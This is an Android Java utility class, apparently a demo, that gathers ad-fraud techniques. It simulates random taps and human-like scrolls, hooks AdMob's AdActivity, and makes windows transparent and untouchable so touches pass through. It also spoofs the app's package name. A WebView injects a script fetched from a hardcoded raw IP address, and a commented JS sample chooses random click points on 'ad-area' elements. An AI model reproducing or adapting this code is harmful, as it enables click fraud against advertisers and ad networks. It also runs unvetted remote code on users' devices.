package com.test.markdemo.use;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.RelativeLayout;
import android.widget.TextView;

import com.test.markdemo.MainActivity;
import com.test.markdemo.R;
import com.test.markdemo.exercise.webviewtest.FloatWindow;
import com.test.markdemo.exercise.webviewtest.WebManager;
import com.test.markdemo.utils.ActivityHooker;
import com.test.markdemo.utils.Hooker;
import com.test.markdemo.utils.InputSimulator;
import com.test.markdemo.utils.PackageAssist;

import java.util.Random;

/**
 * Created by ASUS on 2017/10/25.
 */

public class UtilsUse {
    public static void clickAndRoll(Context context, Activity activity) {
        // 获取屏幕宽高
        DisplayMetrics dm = new DisplayMetrics();
        dm = context.getResources().getDisplayMetrics();
        int screenWidth = dm.widthPixels;// 屏幕宽（像素，如：480px）  
        int screenHeight = dm.heightPixels;// 屏幕高（像素，如：800px）

        int w = screenWidth/2;
        int h = screenHeight/2;

        // View 的自动点击
//        TextView tvView = (TextView) findViewById(R.id.tv);
        TextView tvView = new TextView(context);
        InputSimulator.clickRandom(tvView, w, h);

        // Activity对象的自动点击
//        Activity activity = activity;
        InputSimulator.sendTap(activity,w,h);

        //Activity对象 转化为View对象
        View decorView = activity.getWindow().getDecorView();


        // View 的滑动
        View view = new View(context);
        boolean scrollDown = true; // true-下滑，false-上滑
        DisplayMetrics metrics = new DisplayMetrics();
        WindowManager windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        windowManager.getDefaultDisplay().getMetrics(metrics);
        int clientWidth = metrics.widthPixels;
        int clientHeight = metrics.heightPixels;
        int ty;
        Random random = new Random();

        int fx = (int) (Math.floor(clientWidth * (0.4 + Math.random() * 0.1)));
        int fy = (int) Math.floor(clientHeight * (0.8 + Math.random() * 0.1));
        int tx = (int) Math.floor(clientWidth * (0.3 + Math.random() * 0.2));
        int scrollLength = (int) Math.floor(clientHeight * (0.5 + Math.random() * 0.2));
        int length = scrollLength;
        ty = fy - length;
        int r = 1 + random.nextInt(2);
        int n = 2 + random.nextInt(5);
        if (scrollDown) {
            // fy < ty（起始坐标 < 目标坐标）往下滑动
            InputSimulator.roll(view, fx, fy, tx, ty, 100, (r * 1000 + n * 100));
            //分为100等分，没等分 (r * 1000 + n * 100)/100 毫秒
        } else {
            //起始坐标 > 目标坐标 往上滑动
            InputSimulator.roll(view, tx, ty, fx, fy, 100, (r * 1000 + n * 100));
        }
    }

    public static void hookActivityAndstartActivity(Context context) {
        Hooker.clearHock();
        ActivityHooker.hock(context);
        Hooker.hook();
        ActivityHooker.addHooker(new ActivityHooker.OnActivityHooker() {
            @Override
            public void onCreateBefore(Context context, Activity activity) {
                if (activity.getClass().getName().equals("com.google.android.gms.ads.AdActivity")) {
                    /*if (showAdsAutoClick) {
                        activity.getWindow().getAttributes().flags =
                                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;
                        //透明的时候可以透过执行点击滑动等操作
                    }
                    activity.getWindow().getAttributes().alpha = alpha;*/
                }
            }

            @Override
            public void onCreateAfter(final Context context, final Activity activity) {
//                Logger.i(context, "activity name = " + activity.getClass().getName());
                if (activity.getClass().getName().equals("com.google.android.gms.ads.AdActivity")) {
//                    activity.getWindow().getDecorView().setAlpha(alpha);
                }
            }
        });
        Hooker.addHocker(new Hooker.OnActivityManagerHooker() {
            @Override
            public void onStartActivity(final Intent intent, Hooker.Handle handle) {
                if (intent.getData() != null) {


                }
                //例子
                if ("com.google.android.gms.ads.identifier.service.START".equals(intent.getAction())) {

                }
            }
        });
    }
    public static void setActivityVisible(Activity activity, Context context) {
        //透明activity，点击事件可透过activity，必须在 super.onCreate 之前
        InputSimulator.hideActivity(activity,context);

        // 一般下面 方法即可完成当前activity透明
        activity.getWindow().addFlags(WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
                | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
        );
    }
    private static final String JS_URL = "http://116.62.230.86:8080/RanClick.js";
    public static void JSUsed(Context context) {
        //clickJsAd 方法名， ForeignSdk 调用接口名，adsClick调用方法名
        WebView webview = new WebView(context);
        webview.getSettings().setJavaScriptEnabled(true);;
        webview.addJavascriptInterface(new WebInterface(),"ForeignSdk");
        webview.loadUrl("");
        // 开始调用js方法，获取js的值
        hock(webview, JS_URL, "clickJsAd()");
    }

    public static void showWindow(Context context) {
        // context - Activity 的上下文随着Activity销毁，window会销毁
        // context.getApplicationContext() - Activity销毁，window不会销毁
//        WebManager webManager = new WebManager(context,null);
//        WebManager webManager = new WebManager(context.getApplicationContext(),null);
//        webManager.setup("","https://www.baidu.com/");
//        webManager.setup("","https://www.facebook.com/");

//        this.startService(new Intent(this,Mservice.class));

        final FloatWindow floatWindow = new FloatWindow(context.getApplicationContext());
        FloatWindow.ViewInfo info = FloatWindow.ViewInfo.get(context);
        floatWindow.setWidth(RelativeLayout.LayoutParams.MATCH_PARENT);
        floatWindow.setHeight(floatWindow.getWindowManager().getDefaultDisplay().getHeight() - info.getStatusBarHeight());
//        floatWindow.setWidth(RelativeLayout.LayoutParams.WRAP_CONTENT);
//        floatWindow.setHeight(RelativeLayout.LayoutParams.MATCH_PARENT);
        floatWindow.setFlag(WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
                | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE);
//        params.flags=WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH
//                | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL
//                | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
//                | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;

        WebView webView = new WebView(context);
        webView.setWebViewClient(new WebViewClient(){
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
                return false;
            }
        });
        TextView tv = new TextView(context);
        tv.setText("测试");
        tv.setTextSize(50.0f);
//        tv.setAlpha(0);
        webView.loadUrl("https://www.baidu.com/");
        floatWindow.setView(tv);
//        webView.setAlpha(1);
        floatWindow.show();
        Log.e("Sdk", "===");
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
//                floatWindow.close();
            }
        },30000);
    }

    public static void changePakageName(final Context context) {
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                PackageAssist instance = PackageAssist.getInstance();
                instance.init(context.getApplicationContext());


                Log.e("123", "11  "+context.getApplicationContext().getPackageName());
                PackageAssist.setReplacePkg("com.test.pg");
                Log.e("123", "22  "+context.getApplicationContext().getPackageName());
            }
        },10);
    }

    //不用 static ，JSUsed static引起
    private static class WebInterface{
        @JavascriptInterface
        public void adsClick(int x, int y) {
            Log.i("123", "adsClick 调用");

        }
    }
    //不用static ，JSUsed static引起
    private static void hock(WebView _webView, String url, final String invoke)
    {
        String js = "var newscript = document.createElement(\"script\");";
        js += "newscript.src=\"" + url + "\";";
        js += String.format("newscript.onload=function(){%s;};", invoke); // xxx()代表js中某方法
        js += "document.body.appendChild(newscript);";
        _webView.loadUrl("javascript:" + js);
        Log.i("123","调用Js点击方法");
    }
    /*
    *  上面举例js ：clickJsAd 方法名， ForeignSdk 调用接口名，adsClick调用方法名
function clickJsAd() {
    var targets = document.getElementsByClassName('ad-area');
    if (targets.length < 1) {
        return;
    }
    var target = targets[Math.floor(Math.random() * targets.length)];
    var box = getRandomClick(target);
    ForeignSdk.adsClick(box.left, box.top);
}

function getRandomClick(target) {
    var box = {};
    var titleX = Math.floor(target.getBoundingClientRect().left + target.offsetWidth * (Math.random()*0.6 + 0.2));
    var titleY = Math.floor(target.getBoundingClientRect().top + target.offsetHeight * (Math.random()*0.5 + 0.3));
    box.top = titleY;
    box.left = titleX;
    return box;
}
    *
    * */

}
